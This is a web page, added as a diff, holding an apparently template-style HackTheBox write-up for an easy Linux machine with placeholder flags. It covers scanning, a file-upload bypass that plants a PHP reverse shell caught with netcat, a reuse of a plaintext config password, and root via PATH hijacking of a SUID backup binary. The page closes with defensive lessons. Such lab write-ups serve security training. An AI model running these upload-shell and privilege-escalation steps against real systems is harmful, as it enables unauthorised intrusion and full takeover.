@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[HTB] Machine Example - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <h1>[HTB] Machine Example Writeup</h1>
+                
+                <!-- Machine Info Box -->
+                <div class="box-info">
+                    <table>
+                        <tr>
+                            <td>Platform:</td>
+                            <td>HackTheBox</td>
+                        </tr>
+                        <tr>
+                            <td>Machine:</td>
+                            <td>Machine Example</td>
+                        </tr>
+                        <tr>
+                            <td>OS:</td>
+                            <td>Linux</td>
+                        </tr>
+                        <tr>
+                            <td>Difficulty:</td>
+                            <td><span class="difficulty easy">Easy</span></td>
+                        </tr>
+                        <tr>
+                            <td>Points:</td>
+                            <td>20</td>
+                        </tr>
+                        <tr>
+                            <td>Release:</td>
+                            <td>2026-01-15</td>
+                        </tr>
+                        <tr>
+                            <td>IP Address:</td>
+                            <td>10.10.10.100</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">linux</span>
+                    <span class="tag">web</span>
+                    <span class="tag">privesc</span>
+                </div>
+
+                <h2>## Summary</h2>
+                
+                <p>
+                    Machine Example is an easy Linux box featuring a vulnerable web application with 
+                    file upload functionality that allows us to get a shell. Privilege escalation 
+                    is achieved through a misconfigured SUID binary.
+                </p>
+
+                <h2>## Reconnaissance</h2>
+                
+                <h3>### Nmap Scan</h3>
+                
+                <p>Starting with a comprehensive nmap scan:</p>
+
+                <pre><code>$ nmap -sCV -p- -oA nmap/machine-example 10.10.10.100
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.41
+|_http-title: Upload Portal
+|_http-server-header: Apache/2.4.41 (Ubuntu)</code></pre>
+
+                <p>We have SSH on port 22 and a web server on port 80.</p>
+
+                <h3>### Web Enumeration</h3>
+                
+                <p>Visiting the website reveals an upload portal. Let's enumerate directories:</p>
+
+                <pre><code>$ gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
+
+/uploads              (Status: 301)
+/admin                (Status: 403)
+/index.php            (Status: 200)</code></pre>
+
+                <h2>## Initial Foothold</h2>
+                
+                <h3>### File Upload Bypass</h3>
+                
+                <p>The upload portal only accepts images. Let's try to bypass this restriction:</p>
+
+                <pre><code># Create a PHP reverse shell with image extension
+$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php.jpg
+
+# Intercept the request with Burp and change:
+# Content-Type: image/jpeg
+# Filename: shell.php</code></pre>
+
+                <p>After uploading, we can access our shell at <code>/uploads/shell.php</code></p>
+
+                <h3>### Getting a Shell</h3>
+
+                <pre><code># Start listener
+$ nc -lvnp 4444
+
+# Trigger the shell
+$ curl http://10.10.10.100/uploads/shell.php
+
+# We get a connection!
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.100] 48234
+$ whoami
+www-data</code></pre>
+
+                <h3>### Shell Upgrade</h3>
+
+                <pre><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@machine:/var/www/html$ export TERM=xterm
+www-data@machine:/var/www/html$ ^Z
+$ stty raw -echo; fg</code></pre>
+
+                <h2>## User Flag</h2>
+                
+                <p>Looking around, we find credentials in the web application config:</p>
+
+                <pre><code>www-data@machine:/var/www/html$ cat config.php
+&lt;?php
+$db_user = "admin";
+$db_pass = "SuperSecretPass123!";
+?&gt;</code></pre>
+
+                <p>This password works for the user <code>developer</code>:</p>
+
+                <pre><code>www-data@machine:/var/www/html$ su developer
+Password: SuperSecretPass123!
+
+developer@machine:~$ cat user.txt
+HTB{f4k3_us3r_fl4g_h3r3}</code></pre>
+
+                <h2>## Privilege Escalation</h2>
+                
+                <h3>### Enumeration</h3>
+                
+                <p>Let's check for SUID binaries:</p>
+
+                <pre><code>developer@machine:~$ find / -perm -4000 2>/dev/null
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chsh
+/opt/backup  &lt;-- Interesting!</code></pre>
+
+                <h3>### Exploiting the SUID Binary</h3>
+                
+                <p>The <code>/opt/backup</code> binary has SUID permissions and calls <code>tar</code> without a full path:</p>
+
+                <pre><code>developer@machine:~$ strings /opt/backup
+...
+tar -czf /backups/backup.tar.gz /var/www/html
+...</code></pre>
+
+                <p>We can exploit this via PATH hijacking:</p>
+
+                <pre><code># Create malicious tar
+developer@machine:~$ echo '#!/bin/bash' > /tmp/tar
+developer@machine:~$ echo 'chmod +s /bin/bash' >> /tmp/tar
+developer@machine:~$ chmod +x /tmp/tar
+
+# Modify PATH and run the binary
+developer@machine:~$ export PATH=/tmp:$PATH
+developer@machine:~$ /opt/backup
+
+# Now bash has SUID
+developer@machine:~$ /bin/bash -p
+bash-5.0# whoami
+root</code></pre>
+
+                <h2>## Root Flag</h2>
+
+                <pre><code>bash-5.0# cat /root/root.txt
+HTB{f4k3_r00t_fl4g_h3r3}</code></pre>
+
+                <h2>## Lessons Learned</h2>
+                
+                <ul>
+                    <li>Always validate file uploads on the server-side</li>
+                    <li>Never store credentials in plaintext configuration files</li>
+                    <li>Use absolute paths in SUID binaries</li>
+                    <li>Regularly audit file permissions</li>
+                </ul>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Machine Example</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../hackthebox.html">&lt;&lt; Back to HackTheBox</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
